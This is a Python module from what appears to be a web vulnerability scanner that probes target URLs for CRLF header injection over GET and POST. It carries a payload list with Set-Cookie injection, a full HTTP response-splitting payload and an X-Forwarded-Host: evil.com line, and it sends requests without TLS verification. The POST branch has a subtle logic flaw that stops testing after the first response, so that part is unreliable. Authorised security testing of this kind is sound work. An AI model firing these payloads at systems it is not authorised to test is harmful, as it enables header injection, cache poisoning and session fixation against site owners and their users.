import requests
import random
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
from parametizer.bounded_pool import run_threadpool_in_chunks
from colorama import Fore, ansi, init
from typing import List, Optional, Set, Tuple

from urllib.parse import quote, urlparse, parse_qs, parse_qsl, unquote, urlunparse
from threading import Lock
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Por payload GET: hasta 3 ubicaciones (1er param, 2º param si existe, append / ?q=) — POST no se duplica.
CRLF_GET_VARIANTS_MAX = 3
# Reintentos por variante: CDN/WAF a veces no reflejan CRLF en la 1ª respuesta (no reducir).
CRLF_PROBE_ATTEMPTS = 5
CRLF_PROBE_DELAY_S = 0.2
# Misma política en baseline y sondas para no comparar una respuesta cacheada con otra fresca.
CRLF_CACHE_BUST_HEADERS = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
# HTTP >= este umbral + solo detección semántica "débil" → descartar (reduce FPs en páginas de error).
CRLF_HTTP_ERROR_THRESHOLD = 400
# Recursos estáticos: mismo criterio en filtro de test_url y en peso del progreso.
CRLF_STATIC_SKIP_EXTENSIONS = (
    ".css",
    ".js",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".ico",
    ".svg",
    ".woff",
    ".woff2",
    ".ttf",
    ".eot",
)
# Marcador poco probable en respuestas legítimas (evita FP con Cache-Control: no-store genérico de CDN).
CRLF_PROBE_MARK = "NeluxCRLFProbe9f2a"
CRLF_PAYLOAD_X_NELUX = f"%0d%0aX-Nelux-CRLF:%20{CRLF_PROBE_MARK}%0d%0a"
init(autoreset=True)


def _crlf_is_static_asset_path(base_url: str) -> bool:
    return any(ext in base_url.lower() for ext in CRLF_STATIC_SKIP_EXTENSIONS)


def _encode_query_pairs_crlf(pairs: List[Tuple[str, str]]) -> str:
    """
    Codifica query sin re-escapar '%' ya presente (payloads %0d%0a).
    urlencode() convierte % en %25 y rompe CRLF en valores.
    """
    return "&".join(f"{quote(k, safe='')}={quote(v, safe='%')}" for k, v in pairs)


def _crlf_with_cache_headers(base_headers: dict) -> dict:
    """Baseline y sondas usan la misma política anti-caché (evita FP por CDN)."""
    out = dict(base_headers)
    out.update(CRLF_CACHE_BUST_HEADERS)
    return out


def _crlf_payload_match_variants(payload: str) -> Set[str]:
    """Reflejos con %0D%0A vs %0d%0a o mezclas en cabeceras."""
    v: Set[str] = {payload}
    if "%0d%0a" in payload:
        v.add(payload.replace("%0d%0a", "%0D%0A"))
        v.add(payload.replace("%0d%0a", "%0d%0A"))
    if "%0a" in payload and "%0d%0a" not in payload:
        v.add(payload.replace("%0a", "%0A"))
    return v


def _build_crlf_get_url(url: str, payload: str) -> str:
    """
    Una sola URL de prueba: si hay query, inyecta el payload al valor del primer parámetro;
    si no, concatena al final (comportamiento anterior).
    """
    parsed = urlparse(url)
    if not parsed.query:
        return url + payload
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if not pairs:
        return url + payload
    key, val = pairs[0]
    new_pairs = [(key, val + payload)] + list(pairs[1:])
    new_query = _encode_query_pairs_crlf(new_pairs)
    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        )
    )


def _build_crlf_get_url_param_index(url: str, payload: str, param_index: int) -> Optional[str]:
    """Inyecta el payload al valor del parámetro en índice `param_index` (0 = primero)."""
    parsed = urlparse(url)
    if not parsed.query:
        return None
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if param_index >= len(pairs):
        return None
    new_pairs = list(pairs)
    k, val = new_pairs[param_index]
    new_pairs[param_index] = (k, val + payload)
    new_query = _encode_query_pairs_crlf(new_pairs)
    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        )
    )


def _crlf_get_variants(url: str, payload: str) -> List[str]:
    """
    Hasta CRLF_GET_VARIANTS_MAX URLs por (url, payload):
    - Sin query: path+payload y `?q=payload`.
    - Con query: 1er param, 2º param (si existe), y `url+payload` solo si no repite inyección en último param.
    """
    primary = _build_crlf_get_url(url, payload)
    out: List[str] = [primary]
    parsed = urlparse(url)
    base = url.split("#")[0]
    pairs = parse_qsl(parsed.query, keep_blank_values=True) if parsed.query else []

    if not parsed.query:
        alt = f"{base.rstrip('/')}?q={payload}"
        if alt != primary:
            out.append(alt)
    else:
        if len(pairs) >= 2:
            second = _build_crlf_get_url_param_index(url, payload, 1)
            if second and second not in out:
                out.append(second)
        last_inj: Optional[str] = None
        if pairs:
            last_inj = _build_crlf_get_url_param_index(url, payload, len(pairs) - 1)
        appended = url + payload
        if (
            appended != primary
            and appended not in out
            and (last_inj is None or appended != last_inj)
        ):
            out.append(appended)

    seen = set()
    uniq: List[str] = []
    for u in out:
        if u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq[:CRLF_GET_VARIANTS_MAX]


def _crlf_get_variant_slot_count(url: str) -> int:
    """Coincide con `len(_crlf_get_variants)` para el mismo ancho de progreso."""
    return len(_crlf_get_variants(url, "%0d%0a"))


def _build_crlf_post_data(params: dict, payload: str) -> dict:
    """Misma lógica que el baseline (TEST123), pero el primer parámetro lleva TEST123+payload."""
    keys = list(params.keys())
    if not keys:
        return {}
    data = {keys[0]: "TEST123" + payload}
    for k in keys[1:]:
        data[k] = "TEST123"
    return data


def _crlf_semantic_success(
    response_headers,
    baseline_headers,
    payload: str,
    response_status: Optional[int] = None,
    baseline_status: Optional[int] = None,
) -> Optional[str]:
    """
    Sin peticiones extra: detecta inyección exitosa cuando el eco literal del payload
    no aparece en un solo header pero sí el efecto (Set-Cookie, X-*, etc.).
    """
    pl = payload.lower()
    crlf_probe_mark_lower = CRLF_PROBE_MARK.lower()
    bh = {k.lower(): str(v) for k, v in baseline_headers.items()}
    rh = {k.lower(): str(v) for k, v in response_headers.items()}

    if "set-cookie" in pl or "%0d%0aset-cookie" in pl or "crlf2=injected" in pl:
        b = bh.get("set-cookie", "")
        r = rh.get("set-cookie", "")
        if "CRLF=Injected" in r and "CRLF=Injected" not in b:
            return "Set-Cookie: CRLF=Injected (semantic detection)"
        if "CRLF2=injected" in r and "CRLF2=injected" not in b:
            return "Set-Cookie: CRLF2=injected (semantic detection)"

    if "location" in pl and "example.com" in pl:
        r = rh.get("location", "")
        if "example.com" in r.lower() and "example.com" not in bh.get("location", "").lower():
            return "Location includes example.com (semantic detection)"

    # Ya no se usa Cache-Control: no-store en el payload (demasiados FP vs CDN). Ver CRLF_PAYLOAD_X_NELUX.
    if "x-nelux-crlf" in pl and crlf_probe_mark_lower in pl:
        b = bh.get("x-nelux-crlf", "").lower()
        r = rh.get("x-nelux-crlf", "").lower()
        if crlf_probe_mark_lower in r and crlf_probe_mark_lower not in b:
            return f"X-Nelux-CRLF: {CRLF_PROBE_MARK} (semantic detection)"

    if "x-xss-protection" in pl:
        # FP común: baseline 4xx vs respuesta 2xx/3xx = otra ruta (CDN, SharePoint, login); el header
        # X-XSS-Protection: 0 aparece en respuestas MS sin CRLF.
        skip_xss_sem = False
        if baseline_status is not None and response_status is not None:
            if (baseline_status >= 400) != (response_status >= 400):
                skip_xss_sem = True
        if not skip_xss_sem:
            b = bh.get("x-xss-protection", "").strip()
            r = rh.get("x-xss-protection", "").strip()
            if r == "0" and r != b:
                return "X-XSS-Protection: 0 (semantic detection)"

    if "x-forwarded-for" in pl and "127.0.0.1" in pl:
        b = bh.get("x-forwarded-for", "")
        r = rh.get("x-forwarded-for", "")
        if "127.0.0.1" in r and "127.0.0.1" not in b:
            return "X-Forwarded-For contains 127.0.0.1 (semantic detection)"

    if "x-forwarded-host" in pl and "evil.com" in pl:
        b = bh.get("x-forwarded-host", "").lower()
        r = rh.get("x-forwarded-host", "").lower()
        if "evil.com" in r and "evil.com" not in b:
            return "X-Forwarded-Host reflects evil.com (semantic detection)"

    # Not used: "baseline had no text/html but probe does" caused many FPs (CDN/marketing vs policy
    # page, malformed URL → different route). Real split should show via literal header reflection
    # or stronger semantics (Set-Cookie, X-Nelux-CRLF, etc.).

    if "nelux-crlf-1" in pl or "x-crlf-probe" in pl:
        b = bh.get("x-crlf-probe", "").lower()
        r = rh.get("x-crlf-probe", "").lower()
        if "nelux-crlf-1" in r and "nelux-crlf-1" not in b:
            return "X-CRLF-Probe: nelux-crlf-1 (semantic detection)"

    return None


def _crlf_semantic_strong_under_error_status(sem_reason: str) -> bool:
    """
    Con HTTP 4xx/5xx, solo estas señales semánticas se consideran suficientemente fiables.
    Las débiles (p. ej. X-XSS-Protection) suelen aparecer en respuestas de error genéricas.
    """
    lower = sem_reason.lower()
    if "set-cookie" in lower:
        return True
    if "location" in lower and "example.com" in lower:
        return True
    if "x-crlf-probe" in lower or "nelux-crlf-1" in lower:
        return True
    if "x-nelux-crlf" in lower and CRLF_PROBE_MARK.lower() in lower:
        return True
    if "x-forwarded-for" in lower or "x-forwarded-host" in lower:
        return True
    if "x-xss-protection" in lower:
        return False
    return False


def _crlf_unpack_baseline(entry) -> Tuple[dict, Optional[int]]:
    """Cache: tupla (headers, status) o solo headers (legacy)."""
    if isinstance(entry, tuple) and len(entry) == 2:
        return entry[0], entry[1]
    return entry, None


def _crlf_value_reflects_payload(header_value: str, payload: str) -> bool:
    """Eco en valor de cabecera: literal, CRLF decodificado, mayúsculas en %XX, URL-decoded."""
    if not header_value:
        return False
    clean = payload.replace("%0d%0a", "\r\n").replace("%0a", "\n").replace("%0d", "\r")
    for pv in _crlf_payload_match_variants(payload):
        if pv in header_value:
            return True
    if clean in header_value:
        return True
    try:
        dec = unquote(header_value)
    except Exception:
        dec = header_value
    if clean in dec:
        return True
    for pv in _crlf_payload_match_variants(payload):
        if pv in dec:
            return True
    return False


def is_crlf_vulnerable(
    response_headers,
    baseline_headers,
    payload: str,
    response_status: Optional[int] = None,
    baseline_status: Optional[int] = None,
) -> Tuple[bool, str]:
    """
    1) Eco del payload en cabeceras (variantes %0d%0a / %0D%0A, valor decodificado).
       Si hay reflejo literal, no se filtra por código HTTP (sigue siendo evidencia útil).
    2) Detección semántica: con HTTP >= 400, se descartan señales débiles (p. ej. X-XSS-Protection)
       para reducir falsos positivos en respuestas de error.
    """
    for header_name, header_value in response_headers.items():
        if _crlf_value_reflects_payload(str(header_value), payload):
            return True, f"Payload found in header '{header_name}': {header_value}"

    baseline_header_names = set(baseline_headers.keys())
    response_header_names = set(response_headers.keys())

    new_headers = response_header_names - baseline_header_names
    if new_headers:
        for header_name in new_headers:
            header_value = response_headers[header_name]
            if _crlf_value_reflects_payload(str(header_value), payload):
                return True, f"New header '{header_name}' contains payload: {header_value}"

    for header_name in baseline_header_names & response_header_names:
        old_value = baseline_headers[header_name]
        new_value = response_headers[header_name]

        if old_value != new_value:
            if _crlf_value_reflects_payload(str(new_value), payload):
                return (
                    True,
                    f"Modified header '{header_name}' contains payload: {new_value}",
                )

    sem = _crlf_semantic_success(
        response_headers,
        baseline_headers,
        payload,
        response_status=response_status,
        baseline_status=baseline_status,
    )
    if sem:
        if (
            response_status is not None
            and response_status >= CRLF_HTTP_ERROR_THRESHOLD
            and not _crlf_semantic_strong_under_error_status(sem)
        ):
            bs = (
                f", baseline HTTP {baseline_status}"
                if baseline_status is not None
                else ""
            )
            return (
                False,
                f"Semantic signal discarded for HTTP {response_status}{bs}: {sem}",
            )
        return True, sem

    return False, "No payload reflection found in response headers"

def crlf(urip, urif, urls_vulnerables, threads, custom_headers, random_agent):   
    print('\033[1;36m<<<<<<<<<<<<\033[0m Testing CRLF Injection \033[1;36m>>>>>>>>>>>>>>\033[0m')
    print()
    
    crlf_payloads = [
        "%0d%0aSet-Cookie: CRLF=Injected",
        "%0d%0aX-CRLF-Probe: nelux-crlf-1%0d%0a",
        "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 19%0d%0a%0d%0a<html>CRLF</html>",
        "%0d%0aX-XSS-Protection: 0%0d%0a",
        "%0d%0aX-Forwarded-For: 127.0.0.1%0d%0a",
        "%0d%0aX-Forwarded-Host: evil.com%0d%0a",
        "%0d%0aLocation:%20https://example.com%0d%0a",
        "%0a%0aSet-Cookie:%20CRLF2=injected",
        CRLF_PAYLOAD_X_NELUX,
    ]

    def _crlf_progress_weight(u: str) -> int:
        """Pasos de `current += 1` por URL (misma lógica que test_url: skip estático / skip vuln)."""
        base_url = u.split("?")[0]
        if _crlf_is_static_asset_path(base_url):
            return 1
        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            return 1
        np = len(crlf_payloads)
        gv = _crlf_get_variant_slot_count(u)
        w = np * gv
        if parse_qs(urlparse(u).query):
            w += np
        return w

    total_tasks = sum(_crlf_progress_weight(u) for u in urip + urif)
    current = 0
    lock = Lock()
    found_urls = set()
    vulnerable_endpoints = set()
    found = []
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    stdout_lock = Lock()

    def test_url(url):
        nonlocal current
        base_url = url.split('?')[0]

        # Filtrar archivos estáticos que raramente son vulnerables a CRLF
        if _crlf_is_static_asset_path(base_url):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        target_steps = _crlf_progress_weight(url)
        steps_done = 0

        def bump():
            nonlocal current, steps_done
            with lock:
                current += 1
                steps_done += 1
                update_progress(current, total_tasks)

        try:
            # Test GET con cache de baseline
            baseline_key = f"GET-{base_url}"
            if baseline_key not in baseline_cache:
                headers = _crlf_with_cache_headers(
                    get_headers(random_agent=random_agent, custom_headers=custom_headers)
                )
                try:
                    baseline_response = requests.get(url, headers=headers, verify=False, timeout=5)
                    baseline_cache[baseline_key] = (
                        baseline_response.headers,
                        baseline_response.status_code,
                    )
                except (requests.exceptions.Timeout, requests.exceptions.RequestException):
                    baseline_cache[baseline_key] = ({}, None)
            baseline_headers, baseline_status_get = _crlf_unpack_baseline(
                baseline_cache[baseline_key]
            )

            for payload in crlf_payloads:
                payload_hit = False
                for req_url in _crlf_get_variants(url, payload):
                    headers = _crlf_with_cache_headers(
                        get_headers(random_agent=random_agent, custom_headers=custom_headers)
                    )
                    got_vuln = False
                    for attempt in range(CRLF_PROBE_ATTEMPTS):
                        try:
                            response = requests.get(
                                req_url, headers=headers, verify=False, timeout=5
                            )
                            is_vulnerable, reason = is_crlf_vulnerable(
                                response.headers,
                                baseline_headers,
                                payload,
                                response_status=response.status_code,
                                baseline_status=baseline_status_get,
                            )
                            if is_vulnerable:
                                with lock:
                                    if req_url not in found_urls:
                                        found_urls.add(req_url)
                                        vuln_manager.mark_as_exploited(
                                            base_url, base_url_only=True
                                        )

                                        with stdout_lock:
                                            print_vulnerability(
                                                f"{Fore.GREEN}[GET] [VULNERABLE] {req_url}"
                                            )
                                            if attempt > 0:
                                                print(
                                                    f"\033[2m(detected on attempt {attempt + 1}/{CRLF_PROBE_ATTEMPTS})\033[0m"
                                                )
                                            print(
                                                f"HTTP {response.status_code}"
                                                + (
                                                    f" (baseline {baseline_status_get})"
                                                    if baseline_status_get is not None
                                                    else ""
                                                )
                                            )
                                            print(f"🚨 {reason}")

                                            injected_headers = []
                                            for header_name, header_value in response.headers.items():
                                                if _crlf_value_reflects_payload(
                                                    str(header_value), payload
                                                ):
                                                    injected_headers.append(
                                                        f"{header_name}: {header_value}"
                                                    )

                                            if injected_headers:
                                                print(f"Injected Headers:")
                                                for header in injected_headers:
                                                    print(f"  {header}")
                                            else:
                                                print(f"New/Modified Headers detected:")
                                                baseline_header_names = set(
                                                    baseline_headers.keys()
                                                )
                                                response_header_names = set(
                                                    response.headers.keys()
                                                )

                                                new_headers = (
                                                    response_header_names
                                                    - baseline_header_names
                                                )
                                                if new_headers:
                                                    print(
                                                        f"  New headers: {', '.join(new_headers)}"
                                                    )

                                                modified_headers = []
                                                for header_name in (
                                                    baseline_header_names
                                                    & response_header_names
                                                ):
                                                    if (
                                                        baseline_headers[header_name]
                                                        != response.headers[header_name]
                                                    ):
                                                        modified_headers.append(header_name)

                                                if modified_headers:
                                                    print(
                                                        f"  Modified headers: {', '.join(modified_headers)}"
                                                    )

                                            print(f"Payload used: {payload}")
                                            print(
                                                f"Full URL length: {len(req_url)} characters"
                                            )

                                        # Un solo append (bloque con URL): evita duplicar conteo PoC vs len(found).
                                        vulnerability_info = f"""
[GET] [VULNERABLE] {req_url}
HTTP: {response.status_code} (baseline: {baseline_status_get})
New/Modified Headers detected:
  New headers: {', '.join(new_headers) if 'new_headers' in locals() and new_headers else 'None'}
  Modified headers: {', '.join(modified_headers) if 'modified_headers' in locals() and modified_headers else 'None'}
Payload used: {payload}
Full URL length: {len(req_url)} characters
"""
                                        urls_vulnerables.append(vulnerability_info)

                                        found.append(req_url)
                                got_vuln = True
                                payload_hit = True
                                break
                        except requests.exceptions.Timeout:
                            pass
                        except requests.exceptions.RequestException:
                            pass
                        if attempt < CRLF_PROBE_ATTEMPTS - 1:
                            time.sleep(
                                CRLF_PROBE_DELAY_S + random.uniform(0, 0.08)
                            )
                    if got_vuln:
                        break

                    bump()
                if payload_hit:
                    break

            # Test POST solo si hay parámetros
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:  # Solo hacer POST si hay parámetros
                post_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                # Cache de baseline para POST
                baseline_key = f"POST-{base_url}"
                if baseline_key not in baseline_cache:
                    headers = _crlf_with_cache_headers(
                        get_headers(random_agent=random_agent, custom_headers=custom_headers)
                    )
                    data = {k: "TEST123" for k in params}
                    try:
                        baseline_response = requests.post(post_url, headers=headers, data=data, verify=False, timeout=5)
                        baseline_cache[baseline_key] = (
                            baseline_response.headers,
                            baseline_response.status_code,
                        )
                    except (requests.exceptions.Timeout, requests.exceptions.RequestException):
                        baseline_cache[baseline_key] = ({}, None)
                baseline_headers, baseline_status_post = _crlf_unpack_baseline(
                    baseline_cache[baseline_key]
                )

                for payload in crlf_payloads:
                    headers = _crlf_with_cache_headers(
                        get_headers(random_agent=random_agent, custom_headers=custom_headers)
                    )
                    data = _build_crlf_post_data(params, payload)
                    got_vuln = False
                    for attempt in range(CRLF_PROBE_ATTEMPTS):
                        try:
                            response = requests.post(
                                post_url,
                                headers=headers,
                                data=data,
                                verify=False,
                                timeout=5,
                            )
                            is_vulnerable, reason = is_crlf_vulnerable(
                                response.headers,
                                baseline_headers,
                                payload,
                                response_status=response.status_code,
                                baseline_status=baseline_status_post,
                            )
                            if is_vulnerable:
                                with lock:
                                    if url not in found_urls:
                                        found_urls.add(url)
                                        vuln_manager.mark_as_exploited(
                                            base_url, base_url_only=True
                                        )

                                        with stdout_lock:
                                            print_vulnerability(
                                                f"{Fore.GREEN}[POST] [VULNERABLE] {url}"
                                            )
                                            if attempt > 0:
                                                print(
                                                    f"\033[2m(detected on attempt {attempt + 1}/{CRLF_PROBE_ATTEMPTS})\033[0m"
                                                )
                                            print(
                                                f"HTTP {response.status_code}"
                                                + (
                                                    f" (baseline {baseline_status_post})"
                                                    if baseline_status_post is not None
                                                    else ""
                                                )
                                            )
                                            print(f"🚨 {reason}")

                                            injected_headers = []
                                            for header_name, header_value in response.headers.items():
                                                if _crlf_value_reflects_payload(
                                                    str(header_value), payload
                                                ):
                                                    injected_headers.append(
                                                        f"{header_name}: {header_value}"
                                                    )

                                            if injected_headers:
                                                print(f"Injected Headers:")
                                                for header in injected_headers:
                                                    print(f"  {header}")
                                            else:
                                                print(f"New/Modified Headers detected:")
                                                baseline_header_names = set(
                                                    baseline_headers.keys()
                                                )
                                                response_header_names = set(
                                                    response.headers.keys()
                                                )

                                                new_headers = (
                                                    response_header_names
                                                    - baseline_header_names
                                                )
                                                if new_headers:
                                                    print(
                                                        f"  New headers: {', '.join(new_headers)}"
                                                    )

                                                modified_headers = []
                                                for header_name in (
                                                    baseline_header_names
                                                    & response_header_names
                                                ):
                                                    if (
                                                        baseline_headers[header_name]
                                                        != response.headers[header_name]
                                                    ):
                                                        modified_headers.append(header_name)

                                                if modified_headers:
                                                    print(
                                                        f"  Modified headers: {', '.join(modified_headers)}"
                                                    )

                                            print(f"Payload used: {payload}")
                                            print(
                                                f"Vulnerable parameters: {', '.join(params.keys())}"
                                            )
                                            print(f"POST data sent: {data}")

                                        # Un solo append — coherente con GET (PoC / resumen).
                                        vulnerability_info = f"""
[POST] [VULNERABLE] {url}
HTTP: {response.status_code} (baseline: {baseline_status_post})
New/Modified Headers detected:
  New headers: {', '.join(new_headers) if 'new_headers' in locals() and new_headers else 'None'}
  Modified headers: {', '.join(modified_headers) if 'modified_headers' in locals() and modified_headers else 'None'}
Payload used: {payload}
Vulnerable parameters: {', '.join(params.keys())}
POST data sent: {data}
"""
                                        urls_vulnerables.append(vulnerability_info)

                                        found.append(url)
                            got_vuln = True
                            break
                        except requests.exceptions.Timeout:
                            pass
                        except requests.exceptions.RequestException:
                            pass
                        if attempt < CRLF_PROBE_ATTEMPTS - 1:
                            time.sleep(
                                CRLF_PROBE_DELAY_S + random.uniform(0, 0.08)
                            )
                    if got_vuln:
                        break

                    bump()

        except Exception:
            with lock:
                rem = target_steps - steps_done
                if rem > 0:
                    current += rem
                    steps_done += rem
                    update_progress(current, total_tasks)

    run_threadpool_in_chunks(test_url, urip + urif, threads)

    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    
        print()
    if found:
        print(f'{Fore.CYAN}[+] Found {len(found)} potential CRLF vulnerabilities')
    else:
        print('\033[1;31m[-] No CRLF vulnerabilities found\033[0m')
    print()
    
    return urls_vulnerables
